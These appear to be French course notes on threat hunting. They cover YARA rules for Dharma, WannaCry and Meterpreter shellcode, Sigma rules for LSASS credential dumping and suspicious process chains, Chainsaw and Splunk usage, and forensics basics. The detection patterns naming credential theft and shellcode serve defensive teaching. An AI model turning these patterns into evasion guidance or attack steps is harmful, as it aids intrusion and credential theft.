        reference = "https://securelist.com/from-shamoon-to-stonedrill/77725/"
        hash = "2cd0a5f1e9bcce6807e57ec8477d222a"
    strings:
        $mz = "This program cannot be run in DOS mode."
        $a1 = "FindFirstFile" ascii wide nocase
        $a3 = "FindResource" ascii wide nocase
    condition:
        uint16(0) == 0x5A4D and all of them and filesize &lt; 700000 and
        pe.numberofsections &gt; 4 and pe.numberofsignatures == 0 and
        pe.numberofresources &gt; 1 and pe.numberofresources &lt; 15 and
        for any i in (0..pe.numberof_resources - 1):
        ( (math.entropy(pe.resources[i].offset, pe.resources[i].length) &gt; 7.8) and
          pe.resources[i].id == 101 and pe.resources[i].length &gt; 20000 and
          pe.resources[i].language == 0 and
          not ($mz in (pe.resources[i].offset..pe.resources[i].offset + pe.resources[i].length))
        )
}
Explication :
Recherche de fichiers ayant une ressource cryptée spécifique (id 101).
Utilisation de l'entropie pour identifier des ressources compressées ou cryptées et filtrage par taille et langue des ressources.

Ressources pour le Développement de Règles YARA
Documentation officielle de YARA : [YARA Documentation](https://yara.readthedocs.io/)
Guide Kaspersky sur le développement de règles YARA : [Kaspersky Guide](https://securelist.com/)</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Hunting Evil with YARA (Windows Edition)</strong></summary><div class="indented"><pre class="code code-wrap" id="1ea25200-7eb4-8079-894e-ce03430150c2"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Vue d'Ensemble

Utiliser YARA sur des systèmes Windows est efficace pour identifier les menaces sur le disque et en mémoire.
Étapes Clés :
Se connecter au système cible :
Lancez le système cible.
Utilisez RDP pour vous connecter avec les identifiants fournis.

Recherche de fichiers exécutables malveillants sur le disque
Exemple de fichier : dharma\sample.exe situé dans C:\Samples\YARASigma.
Analyse hexadécimale : Utilisation de HxD pour inspecter des chaînes telles que C:\crysis\Release\PDB\payload.pdb et sssssbsss.
Exemple de règle YARA : Détection de motifs dans des exécutables malveillants.
Règle YARA Exemple : Ransomware Dharma

rule ransomwaredharma {
    meta:
        author = "Madhukar Raina"
        version = "1.0"
        description = "Détecte les chaînes du ransomware Dharma"
        reference = "https://www.virustotal.com"

    strings:
        $stringpdb = { 433A5C6372797369735C52656C656173655C5044425C7061796C6F61642E706462 }
        $stringssss = { 73 73 73 73 73 62 73 73 73 }

    condition: all of them
}
Commande pour exécuter un scan YARA sur des fichiers

yara64.exe -s C:\Rules\yara\dharmaransomware.yar C:\Samples\YARASigma\ -r 2&gt;null
Fichiers détectés : pdf\reader.exe, microsoft.com, check\updates.exe, KB5027505.exe.

Recherche de malwares dans les processus en cours
Processus cible : Exemple avec injection de shellcode Meterpreter.
Règle YARA pour Metasploit Meterpreter :

rule meterpreterreversetcpshellcode {
    meta:
        author = "FDD @ Cuckoo sandbox"
        description = "Shellcode TCP inverse de Meterpreter pour Metasploit"

    strings:
        $s1 = { fce8 8?00 0000 60 }
        $s2 = { 648b ??30 }
        $s3 = { 4c77 2607 }
        $s4 = "ws2"
        $s5 = { 2980 6b00 }
        $s6 = { ea0f dfe0 }
        $s7 = { 99a5 7461 }

    condition: 5 of them
}
Scanning des processus actifs

Get-Process | ForEach-Object { 
    "Scanning with Yara for meterpreter shellcode on PID "+$.id; 
    &amp; "yara64.exe" "C:\Rules\yara\meterpretershellcode.yar" $.id 
}
Résultat : Détecte le shellcode dans le processus PID 9084.

Recherche de comportements malveillants dans les données ETW avec YARA
Principaux fournisseurs ETW (Event Tracing for Windows)
Microsoft-Windows-Kernel-Process : Suit les activités des processus.
Microsoft-Windows-Kernel-File : Surveille les opérations de fichiers.
Microsoft-Windows-DNS-Client : Journalise l'activité DNS (utile pour la détection de C2).
Intégration de YARA avec SilkETW
Exemple de fournisseur PowerShell ETW :

.\SilkETW.exe -t user -pn Microsoft-Windows-PowerShell -ot file -p ./etwpslogs.json -l verbose -y C:\Rules\yara -yo Matches
Règle YARA pour les chaînes PowerShell :

rule powershellhelloworldyara {
    strings:
        $s0 = "Write-Host" ascii wide nocase
        $s1 = "Hello" ascii wide nocase
        $s2 = "from" ascii wide nocase
        $s3 = "PowerShell" ascii wide nocase
    condition: 3 of ($s*)
}
Fournisseur DNS Client :

.\SilkETW.exe -t user -pn Microsoft-Windows-DNS-Client -ot file -p ./etwdnslogs.json -l verbose -y C:\Rules\yara -yo Matches
Règle YARA pour un domaine de WannaCry :

rule dnswannacry_domain {
    strings:
        $s1 = "iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com" ascii wide nocase
    condition: $s1
}
Ces techniques permettent d'effectuer des recherches approfondies à la fois sur le disque et en mémoire, ainsi que dans les processus en cours et les événements système pour identifier les comportements malveillants. L'utilisation de YARA et d'outils comme SilkETW et Volatility permet d'améliorer l'efficacité des investigations de sécurité en exploitant des sources de données variées.</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Hunting Evil with YARA (Linux Edition)</strong></summary><div class="indented"><pre class="code code-wrap" id="1ea25200-7eb4-80bd-9c23-e39f3666f6d8"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Lorsqu'un accès direct à un système est restreint, les captures de mémoire peuvent toujours nous permettre d'enquêter sur des menaces potentielles. En utilisant YARA sur ces captures de mémoire, les analystes en sécurité peuvent rechercher des indicateurs de compromission, même lorsque le système lui-même reste inaccessible.

Processus Clé :
Créer des règles YARA : Développez des règles ciblant les caractéristiques des malwares basés sur la mémoire ou des comportements suspects.
Compiler les règles : Utilisez yarac pour compiler les règles YARA au format binaire .yrc (optionnel pour de meilleures performances).
Capturer l'image mémoire : Utilisez des outils tels que DumpIt, MemDump, Belkasoft RAM Capturer, Magnet RAM Capture, FTK Imager, ou LiME (Linux Memory Extractor).
Analyser l'image mémoire avec YARA : Exécutez YARA sur l'image mémoire pour détecter les correspondances.

Exemple de Scan de Mémoire avec YARA

Image mémoire : compromisedsystem.raw située dans /home/htb-student/MemoryDumps.
Fichier de règle YARA : wannacryartifactsmemory.yar situé dans /home/htb-student/Rules/yara.

yara /home/htb-student/Rules/yara/wannacryartifactsmemory.yar /home/htb-student/MemoryDumps/compromisedsystem.raw --print-strings
Sortie Exemple :

Détection de motifs liés au ransomware WannaCry, comme tasksche.exe et autres artefacts connus.
Intégration de YARA avec Volatility pour l'Analyse de Mémoire

Volatility Framework
Volatility est un outil puissant pour analyser des images mémoire sur plusieurs plateformes OS. En utilisant YARA dans Volatility via le plugin yarascan, les analystes peuvent rechercher des indicateurs de malwares spécifiques dans la mémoire.
Exemple - Recherche d'un Modèle Unique

Rechercher une URI codée en dur sans fichier YARA :

vol.py -f /home/htb-student/MemoryDumps/compromisedsystem.raw yarascan -U "www.iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com"
Sortie :
Trouve des occurrences de cette URI dans l'image mémoire.
Exemple - Scan avec Plusieurs Règles

Appliquer un ensemble de règles YARA avec l'option -y de Volatility :

vol.py -f /home/htb-student/MemoryDumps/compromisedsystem.raw yarascan -y /home/htb-student/Rules/yara/wannacryartifactsmemory.yar
Sortie Exemple :
Identifie des artefacts spécifiques de WannaCry dans l'image mémoire.

Exemple de Règle YARA pour WannaCry

rule RansomwareWannaCry {
    meta:
        author = "Madhukar Raina"
        version = "1.1"
        description = "Détecte les chaînes de caractères liées au ransomware WannaCry"
        reference = "https://www.virustotal.com"

    strings:
        $wannacrypayloadstr1 = "tasksche.exe" fullword ascii
        $wannacrypayloadstr2 = "www.iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com" ascii
        $wannacrypayloadstr3 = "mssecsvc.exe" fullword ascii
        $wannacrypayloadstr4 = "diskpart.exe" fullword ascii
        $wannacrypayload_str5 = "lhdfrgui.exe" fullword ascii

    condition: 3 of them
}
Sortie Exemple :
Identifie des artefacts spécifiques de WannaCry dans l'image mémoire.</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Hunting Evil with YARA (Web Edition)</strong></summary><div class="indented"><pre class="code code-wrap" id="1ea25200-7eb4-8040-8036-ed8c43760311"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Unpac.Me offre une solution robuste pour le désempaquetage des malwares et permet aux analystes en sécurité d'exécuter des règles YARA sur une vaste base de données de soumissions de malwares. Cette plateforme donne accès à un ensemble de données sur les malwares de qualité commerciale, ce qui en fait une ressource précieuse pour les analystes SOC et les chercheurs en malwares.

Tester des Règles YARA avec Unpac.Me

Prenons l'exemple de la règle YARA suivante, ciblant le ransomware Dharma :

rule ransomwaredharma {
    meta:
        author = "Madhukar Raina"
        version = "1.0"
        description = "Détecte les chaînes de caractères du ransomware Dharma"
        reference = "https://www.virustotal.com"

    strings:
        $stringpdb = { 433A5C6372797369735C52656C656173655C5044425C7061796C6F61642E706462 }
        $string_ssss = { 73 73 73 73 73 62 73 73 73 }

    condition: all of them
}
Étapes pour Lancer une Recherche YARA sur Unpac.Me
Inscription : Inscrivez-vous pour un compte gratuit sur Unpac.Me.
Démarrer une Nouvelle Recherche :
Allez dans la section Yara Hunt et sélectionnez Nouvelle Recherche.
Copiez et collez la règle YARA dans le champ de saisie de la règle.
Valider et Scanner :
Cliquez sur Valider pour vous assurer que la règle est correcte, puis cliquez sur Scanner.
Consulter les Résultats : Après le scan, Unpac.Me affiche les résultats, montrant les correspondances en quelques minutes.</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Sigma and Sigma Rules</strong></summary><div class="indented"><pre class="code code-wrap" id="1ea25200-7eb4-804d-8b19-d87a923574c2"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Sigma est un format de signature générique et standardisé qui permet aux analystes SOC de créer, partager et utiliser des règles de détection pour l'analyse des journaux à travers différentes plateformes. Écrites en YAML, les règles Sigma offrent une portabilité inter-plateformes, permettant aux analystes d'écrire une règle une fois et de la déployer sur divers systèmes SIEM et EDR.

Cas d'Utilisation Principaux des Règles Sigma
Analyse Universelle des Journaux : Rédiger des règles de détection une seule fois et les convertir en formats compatibles avec divers SIEM.
Partage de Règles Communautaires : Accéder à une bibliothèque croissante de règles Sigma partagées par la communauté et y contribuer.
Réponse aux Incidents : Rechercher efficacement des indicateurs dans les journaux lors d’incidents.
Chasse Proactive aux Menaces : Utiliser les règles Sigma pour détecter des anomalies ou des menaces dans les ensembles de données.
Intégration avec des Outils d’Automatisation : Automatiser les réponses en utilisant les règles Sigma avec des plateformes SOAR.
Personnalisation : Adapter les règles Sigma aux besoins spécifiques de l'environnement.
Analyse des Écarts : Effectuer une analyse des écarts en alignant les règles personnalisées avec les standards de la communauté.

Comment Sigma Fonctionne

Sigma exprime les modèles de détection dans un format structuré, avec des règles écrites en YAML. Une règle Sigma comprend les éléments suivants :
Titre, Description et ID : Informations de base sur la règle.
Source de Journaux : Spécifie le type de journal cible, la plateforme et l’application.
Modèle de Détection : Inclut les identifiants de recherche et les conditions de correspondance.
Faux Positifs, Auteur et Date : Champs optionnels pour fournir un contexte.

Conversion Sigma (sigmac et pySigma)

Le pouvoir de Sigma réside dans sa capacité à être converti. Des outils comme sigmac (et de plus en plus pySigma) transforment les règles Sigma en requêtes ou configurations compatibles avec des SIEM populaires (ElasticSearch, QRadar, Splunk, etc.).

Structure d'une Règle Sigma

Les règles Sigma sont des fichiers YAML avec des champs structurés. Voici un exemple de format de règle Sigma.

title: Exécution potentielle de la technique LethalHTA 
id: ed5d72a6-f8f4-479d-ba79-02f6a80d7471 
status: test 
description: Détecte une technique potentielle LethalHTA où "mshta.exe" est lancé par un processus "svchost.exe"
references:
https://codewhitesec.blogspot.com/2018/07/lethalhta.html
author: Markus Neis 
date: 2018/06/07 
tags: 
attack.defenseevasion 
attack.t1218.005 
logsource: 
    category: processcreation  
    product: windows
detection:
    selection: 
        ParentImage|endswith: '\svchost.exe'
        Image|endswith: '\mshta.exe'
    condition: selection
falsepositives: 
Unknown
level: high
Composants Clés d'une Règle Sigma
Titre : Décrit l'objet de détection (par exemple, "Exécution potentielle de la technique LethalHTA").
ID : Identifiant unique (il est recommandé d'utiliser un UUID).
Statut : Statut de la règle (par exemple, stable, test, expérimental).
Description : Explication succincte de ce que la règle détecte.
Références : Liens vers des articles ou des recherches de soutien.
Auteur : Nom ou pseudonyme du créateur de la règle.
Date : Date de création au format AAAA/MM/JJ.
Source de Journaux : Spécifie la source du journal et la plateforme (par exemple, catégorie : process_creation, produit : windows).
Modèle de Détection :
Sélection : Spécifie les motifs à faire correspondre dans les journaux.
Condition : Décrit la relation entre les motifs (par exemple, condition : sélection).

Modificateurs de Détection

Les modificateurs affinent les recherches de détection :
contains : Utilise des jokers aux deux extrémités d'une valeur (par exemple, CommandLine|contains).
startswith / endswith : Utilise des jokers à une extrémité seulement.
re : Correspondance basée sur des expressions régulières.

Exemple d'utilisation de modificateurs :

detection:
  selection:
    ParentImage|endswith: '\svchost.exe'
    Image|endswith: '\mshta.exe'
  condition: selection
Meilleures Pratiques pour le Développement de Règles Sigma

Le guide de création des règles Sigma fournit des meilleures pratiques pour le développement de règles, y compris des informations détaillées sur la structuration et l'écriture de règles de détection efficaces.

Opérateurs Communs dans les Conditions

Les conditions Sigma lient les éléments de détection, en utilisant des opérateurs comme :
and / or : Conjonctions logiques.
all of them : Correspond à tous les motifs.
not : Exclut certaines correspondances.
Parenthèses () : Force l’ordre des opérations.

Exemple de condition :

condition: selection1 or selection2 or selection3</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Developing Sigma Rules</strong></summary><div class="indented"><pre class="code code-wrap" id="1ea25200-7eb4-80ae-aa34-de30249fd3db"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Introduction aux Règles Sigma : Détection Manuelle Basée sur des Cas Réels

Ce guide présente la création manuelle de règles Sigma, à partir de scénarios concrets visant à détecter des activités suspectes sur un système Windows.

Exemple 1 : Détection d’une Extraction de Crédentiels via LSASS

Contexte : Un processus comme shell.exe (exécutant mimikatz) tente d’accéder à la mémoire du processus lsass.exe. Ce comportement est typiquement détecté via l’Event ID 10 de Sysmon.
Informations clés
Event ID Sysmon : 10
Champs critiques :
TargetImage : processus ciblé (ex. : lsass.exe)
GrantedAccess : droits d’accès, souvent 0x1010 (lecture et requête)
Règle Sigma de base : Accès suspect à LSASS

title: Accès à LSASS avec droit d’accès rare
status: experimental
description: Détecte un accès mémoire au processus LSASS avec le flag d’accès 0x1010
date: 2023/07/08
tags:
attack.credentialaccess
attack.t1003.001
logsource:
  category: processaccess
  product: windows
detection:
  selection:
    TargetImage|endswith: '\lsass.exe'
    GrantedAccess|endswith: '0x1010'
  condition: selection
Explication
TargetImage : vérifie si le processus cible est lsass.exe.
GrantedAccess : filtre les accès avec les droits 0x1010.
Condition : alerte si les critères sont remplis.
Exécution avec sigmac

Pour convertir cette règle en requête PowerShell :

python sigmac -t powershell 'C:\Rules\sigma\procaccesswinlsassaccess.yml'
Version avancée : Filtrage des faux positifs

Ajoute un contrôle sur le chemin d’exécution du processus source, en excluant les chemins habituels.

title: Accès LSASS depuis un programme dans un dossier suspect
id: fa34b441-961a-42fa-a100-ecc28c886725
status: experimental
description: Détection d’un accès mémoire à LSASS depuis un dossier potentiellement malveillant
tags:
attack.credentialaccess
attack.t1003.001
logsource:
  category: processaccess
  product: windows
detection:
  selection:
    TargetImage|endswith: '\lsass.exe'
    GrantedAccess|endswith:
'10'
'30'
'50'
'70'
'90'
'B0'
'D0'
'F0'
  SourceImage|contains:
'\Temp\'
'\Users\Public\'
  condition: selection and not 1 of filteroptional
Exemple 2 : Tentatives d’authentification échouées multiples

Event ID 4776 : utilisé pour détecter des tentatives de validation NTLM. Plusieurs échecs depuis une même machine peuvent indiquer une attaque par force brute.

title: Connexions NTLM échouées depuis une seule machine avec comptes différents
id: 6309ffc4-8fa2-47cf-96b8-a2f72e58e538
logsource:
  product: windows
  service: security
detection:
  selection2:
    EventID: 4776
    TargetUserName: ''
    Workstation: '*'
  condition: selection2 | count(TargetUserName) by Workstation &gt; 3
Explication
Event ID 4776 : événements de tentative d’authentification NTLM.
Déclenchement : lorsqu’une machine tente de se connecter avec plus de 3 comptes différents.

Ressources utiles pour créer des règles Sigma
[Guide officiel de création de règles Sigma](https://github.com/SigmaHQ/sigma/wiki/Rule-Creation-Guide)
[Spécifications Sigma](https://github.com/SigmaHQ/sigma-specification)
[Articles sur le développement Sigma](https://tech-en.netlify.app/articles/en510480/)</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Hunting Evil with Sigma (Chainsaw Edition)</strong></summary><div class="indented"><pre class="code code-wrap" id="1ea25200-7eb4-801f-9d17-ea3dbdba7480"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Analyse des Journaux d'Événements Windows avec Chainsaw

Chainsaw est un outil puissant et gratuit conçu pour aider les analystes en cybersécurité à explorer rapidement les journaux d'événements Windows et détecter des activités suspectes. Il prend en charge les règles Sigma ainsi que des règles personnalisées Chainsaw, ce qui en fait un outil polyvalent pour la chasse aux menaces et l'analyse des journaux.

Vous pouvez trouver Chainsaw dans le répertoire C:\Tools\chainsaw sur le système cible.
Utiliser Chainsaw pour la Recherche de Tentatives de Connexion Échouées Multiples

Dans cet exemple, nous allons appliquer la règle Sigma pour détecter les tentatives de connexion échouées multiples provenant de la même source.

Règle Sigma à utiliser :
winsecuritysuspfailedlogonssinglesource2.yml
Fichier EVTX :
labevents2.evtx

Étapes à suivre :

PS C:\Tools\chainsaw&gt; .\chainsawx8664-pc-windows-msvc.exe hunt C:\Events\YARASigma\labevents2.evtx -s C:\Rules\sigma\winsecuritysuspfailedlogonssinglesource2.yml --mapping .\mappings\sigma-event-logs-all.yml
Sortie :

[+] 1 Detections found on 1 documents
Explication :
La règle a réussi à détecter les tentatives de connexion échouées multiples provenant de la même source. Dans ce cas, elle a trouvé plusieurs tentatives de connexion échouées contre un utilisateur inexistant (NOUSER).

Recherche de Commandes PowerShell Anormalement Longues

PowerShell est souvent utilisé à des fins malveillantes en raison de sa flexibilité et de son intégration avec les API Windows et le framework .NET. Les attaquants peuvent en abuser pour exécuter des commandes malveillantes. Des lignes de commande PowerShell anormalement longues peuvent être un indicateur d'une activité suspecte.

Règle Sigma à utiliser :
proccreationwinpowershellabnormalcommandlinesize.yml
Fichier EVTX :
labevents3.evtx

Règle Sigma (pour référence) :

title: Unusually Long PowerShell CommandLine
id: d0d28567-4b9a-45e2-8bbc-fb1b66a1f7f6
status: test
description: Detects unusually long PowerShell command lines with a length of 1000 characters or more
references:
https://speakerdeck.com/heirhabarov/hunting-for-powershell-abuse
author: oscd.community, Natalia Shornikova / HTB Academy, Dimitrios Bougioukas
date: 2020/10/06
modified: 2023/04/14
tags:
attack.execution
attack.t1059.001
detection.threathunting
logsource:
    category: processcreation
    product: windows
detection:
    selection:
        EventID: 4688
        NewProcessName|endswith:
'\powershell.exe'
'\pwsh.exe'
'\cmd.exe'
    selectionpowershell:
        CommandLine|contains:
'powershell.exe'
'pwsh.exe'
    selectionlength:        
        CommandLine|re: '.{1000,}'
    condition: selection and selectionpowershell and selectionlength
falsepositives:
Unknown
level: low
Étapes à suivre :

PS C:\Tools\chainsaw&gt; .\chainsawx8664-pc-windows-msvc.exe hunt C:\Events\YARASigma\labevents3.evtx -s C:\Rules\sigma\proccreationwinpowershellabnormalcommandlinesize.yml --mapping .\mappings\sigma-event-logs-all-new.yml
Sortie :

[+] 3 Detections found on 3 documents
Explication :
Cette règle a réussi à détecter toutes les instances de lignes de commande PowerShell anormalement longues dans le fichier labevents3.evtx. Ces lignes de commande longues pourraient indiquer qu'un attaquant tente d'exécuter une commande complexe ou obfusquée.

Points Clés à Retenir :
Chainsaw est un outil puissant et rapide pour analyser les journaux d'événements Windows et appliquer des règles Sigma.
Les règles Sigma offrent une manière standardisée de détecter des activités suspectes, comme des tentatives de connexion échouées ou l'exécution de commandes PowerShell anormales.
Une bonne configuration est essentielle lors de l'utilisation des règles Sigma avec Chainsaw ou tout autre outil pour garantir une détection précise des événements.

En utilisant Chainsaw avec des règles Sigma bien configurées, vous pouvez détecter efficacement les menaces et les attaques potentielles dans votre environnement, même en l'absence d'une solution SIEM.</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Hunting Evil with Sigma (Splunk Edition)</strong></summary><div class="indented"><pre class="code code-wrap" id="1ea25200-7eb4-807f-9415-ca91c6fb47a3"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Valider l'Approche Sigma avec Splunk

Comme discuté lors de l'introduction de Sigma, les règles Sigma révolutionnent notre approche de l'analyse des journaux et de la détection des menaces. Agissant comme un traducteur universel, Sigma offre un niveau d'abstraction aux journaux d'événements, supprimant la nécessité d'utiliser des langages de requête spécifiques à un SIEM, et permettant l'utilisation de la logique de détection commune à travers différentes plateformes.

Nous allons maintenant valider cette approche en convertissant deux règles Sigma en format SPL de Splunk et en examinant les résultats.

Exemple 1 : Recherche d'Abus de la Fonction MiniDump pour Dumper la Mémoire de LSASS (comsvcs.dll via rundll32)

Une règle Sigma nommée procaccesswinlsassdumpcomsvcsdll.yml est disponible dans le répertoire suivant :

C:\Tools\chainsaw\sigma\rules\windows\processaccess
Cette règle Sigma détecte les adversaires qui utilisent la fonction d'exportation MiniDump de comsvcs.dll via rundll32 pour effectuer un vidage de mémoire de LSASS.

Pour convertir cette règle en une requête compatible avec Splunk, nous pouvons utiliser sigmac comme suit :

PS C:\Tools\sigma-0.21\tools&gt; python sigmac -t splunk C:\Tools\chainsaw\sigma\rules\windows\processaccess\procaccesswinlsassdumpcomsvcsdll.yml -c .\config\splunk-windows.yml
Cette commande génère la requête SPL suivante :

(TargetImage="\\lsass.exe" SourceImage="C:\\Windows\\System32\\rundll32.exe" CallTrace="comsvcs.dll")
Pour valider la règle dans Splunk :
Accédez à http://[Target IP]:8000.
Ouvrez l'application "Search &amp; Reporting".
Soumettez la requête de recherche SPL générée par sigmac.

Résultat :
La requête SPL détecte avec succès l'abus de la fonction MiniDump pour dumper la mémoire de LSASS.

Exemple 2 : Recherche de Processus Enfant Suspects Lancés par Notepad

Une autre règle Sigma nommée proccreationwinnotepadsuspchild.yml est disponible dans le répertoire :

C:\Rules\sigma
Cette règle Sigma détecte les cas où notepad.exe lance des processus enfants suspects.

Pour convertir cette règle en SPL, nous utilisons sigmac comme suit :

PS C:\Tools\sigma-0.21\tools&gt; python sigmac -t splunk C:\Rules\sigma\proccreationwinnotepadsuspchild.yml -c .\config\splunk-windows.yml
Cela produit la requête SPL suivante :

(ParentImage="\\notepad.exe" (Image="\\powershell.exe" OR Image="\\pwsh.exe" OR Image="\\cmd.exe" OR Image="\\mshta.exe" OR Image="\\cscript.exe" OR Image="\\wscript.exe" OR Image="\\taskkill.exe" OR Image="\\regsvr32.exe" OR Image="\\rundll32.exe" OR Image="\\calc.exe"))
Pour valider la règle dans Splunk :
Accédez à http://[Target IP]:8000.
Ouvrez l'application "Search &amp; Reporting".
Soumettez la requête SPL générée.

Résultat :
La requête SPL détecte les instances où notepad.exe lance des processus suspects, tels que PowerShell.

Personnalisation de Sigma pour la Compatibilité avec le SIEM

Dans de nombreux cas, les fichiers de configuration Sigma, situés dans le répertoire suivant :

C:\Tools\sigma-0.21\tools\config
peuvent nécessiter des personnalisations pour générer des requêtes SIEM précises et utilisables. Ces ajustements de configuration permettent de s'assurer que les règles traduites sont compatibles avec les champs de données et les structures de journaux du SIEM cible.

Points Clés à Retenir :
Sigma agit comme un traducteur universel qui permet de créer des règles communes pour différents systèmes SIEM.
En convertissant les règles Sigma en SPL pour Splunk, nous pouvons valider facilement la détection des comportements malveillants sur des plateformes spécifiques.
Personnaliser les fichiers de configuration Sigma est crucial pour garantir que les règles traduites s'alignent avec les structures de données de votre environnement SIEM.

En utilisant cette méthode, vous pouvez tirer parti des règles Sigma pour renforcer la détection des menaces dans votre environnement, tout en restant flexible face aux outils SIEM spécifiques.</code></pre></div></details></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Introduction to Digital Forensics</strong></summary><div class="indented"><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Key Concepts</strong></summary><div class="indented"><pre class="code code-wrap" id="1ea25200-7eb4-80de-829e-ffa443d9784f"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Preuves électroniques

La criminalistique numérique se concentre sur les preuves électroniques, comprenant des fichiers, des e-mails, des journaux, des bases de données et du trafic réseau.
Les preuves peuvent provenir de diverses sources telles que des ordinateurs, des appareils mobiles, des serveurs, des services cloud et d'autres actifs numériques.
Préservation des preuves

La préservation de l'intégrité et de l'authenticité des preuves numériques est primordiale.
Des procédures appropriées, y compris la documentation de la chaîne de custody, sont essentielles pour éviter toute altération accidentelle et garantir leur recevabilité légale.
Processus forensique

Le processus forensique dans les enquêtes numériques comprend généralement plusieurs étapes clés :
Identification : Déterminer les sources potentielles de preuves.
Collecte : Recueillir les données à l'aide de méthodes forensiques adaptées.
Examen : Analyser les données collectées pour identifier les informations pertinentes.
Analyse : Interpréter les résultats afin de comprendre l'incident.
Présentation : Présenter les résultats de manière claire et compréhensible.
Types de cas

La criminalistique numérique s'applique à différents types d'enquêtes :
Enquêtes sur la cybercriminalité : Cas impliquant des piratages, des fraudes ou du vol de données.
Vol de propriété intellectuelle : Protection des informations propriétaires.
Conduite inappropriée des employés : Enquêtes internes.
Violation de données : Réponse aux incidents de sécurité affectant les organisations.
Soutien à la procédure judiciaire : Assistance dans les procédures légales.
Étapes de base dans une enquête forensique
Créer une image forensique : Créer une copie bit-à-bit du système pour l'analyse.
Documenter l'état du système : Enregistrer les détails tels que les processus actifs, les connexions ouvertes et les utilisateurs connectés.
Identifier et préserver les preuves : Sécuriser toutes les données pouvant contenir des informations pertinentes.
Analyser les preuves : Chercher les éléments de données qui expliquent l'incident.
Analyse de la chronologie : Construire une chronologie pour comprendre la séquence des événements.
Identifier les indicateurs de compromission (IoC) : Localiser les signes de compromission dans les données.
Rapport et documentation : Créer des rapports détaillant les résultats et les actions menées.
La criminalistique numérique pour les analystes SOC

Dans un centre d'opérations de sécurité (SOC), la criminalistique numérique joue un rôle essentiel dans la réponse et l'analyse des cybermenaces.
Analyse post-incident
L'analyse forensique fournit une ventilation détaillée des incidents, aidant les analystes à retracer les méthodes, les motifs et l'identité potentielle de l'attaquant.
Ces informations aident à améliorer les défenses organisationnelles en identifiant les vulnérabilités.
Réponse rapide aux incidents de sécurité
Les outils de criminalistique numérique permettent une analyse rapide de grands ensembles de données, facilitant l'identification rapide du moment de la compromission, des systèmes affectés et de la méthode d'attaque.
La maîtrise rapide de la menace est essentielle pour limiter la portée et l'impact de l'incident.
Considérations légales
La criminalistique fournit des preuves légales recevables, cruciales pour toute action en justice suite à des violations importantes.
Les preuves collectées sont enregistrées, hachées et horodatées afin d'assurer leur intégrité, soutenant leur utilisation en tribunal si nécessaire.
Chasse proactive aux menaces
La criminalistique numérique permet aux équipes SOC de rechercher de manière proactive des signes de compromission plutôt que de se contenter de répondre à des alertes.
Les incidents passés fournissent des IoC et des TTPs (tactiques, techniques et procédures) que les analystes peuvent utiliser pour rechercher des menaces potentielles.
Amélioration de la réponse aux incidents
Une analyse forensique complète permet de mieux adapter les réponses, garantissant que tous les systèmes compromis soient pris en compte.
Comprendre l'ensemble de l'attaque réduit la probabilité que les attaquants réintègrent le système par la même vulnérabilité.
Apprentissage et amélioration continus
Chaque incident offre des opportunités d'apprentissage, aidant les équipes SOC à rester en avance sur les techniques d'attaque en évolution.
En analysant les incidents passés, les analystes peuvent anticiper et se défendre contre de nouvelles tactiques.</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Windows Forensics Overview</strong></summary><div class="indented"><pre class="code code-wrap" id="1ea25200-7eb4-80f0-a3e2-d3e23fd0f3fa"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">NTFS (New Technology File System)

NTFS est le système de fichiers de Microsoft, connu pour ses fonctionnalités qui améliorent la performance, la sécurité et l'intégrité des données. Les artefacts forensiques clés incluent :
Métadonnées des fichiers : Stocke les horodatages et les attributs des fichiers, utiles pour l'analyse de la chronologie des événements.
Entrées MFT : La Master File Table suit les métadonnées de tous les fichiers, fournissant des détails même sur les fichiers supprimés.
Slack de fichier et espace non alloué : Contient des résidus de fichiers supprimés.
Signatures de fichiers : Utilisées pour identifier les fichiers même si leurs extensions sont modifiées.
Journal USN : Enregistre les changements de fichiers, utile pour enquêter sur les modifications.
Fichiers LNK : Raccourcis qui révèlent l'historique d'accès aux fichiers et aux programmes.
Fichiers Prefetch : Indiquent les programmes récemment exécutés.
Hives du Registre : Enregistrent les configurations du système et peuvent révéler des traces de modifications non autorisées.
Shellbags : Suivent la navigation dans les dossiers, en mettant en évidence les répertoires consultés.
Cache de vignettes : Stocke les aperçus des images et documents récemment visualisés.
Corbeille : Conserve les fichiers supprimés, fournissant des informations sur les actions de l'utilisateur.
Flux de données alternatifs (ADS) : Données cachées associées à des fichiers, parfois exploitées par des malwares.
Copies de shadow de volume : Instantanés du système de fichiers pour la récupération de données.
Descripteurs de sécurité et ACL : Stockent les permissions des fichiers, utiles pour analyser les droits d'accès et les violations de sécurité.
Journaux des événements Windows

Les journaux des événements Windows enregistrent les événements système et application, capturant une gamme d'activités des utilisateurs et du système. Situés dans C:\Windows\System32\winevt\logs, ces journaux aident à détecter :
Erreurs système : Problèmes avec le système d'exploitation ou les applications.
Événements de sécurité : Tentatives d'authentification, changements de politique et contrôles d'accès.
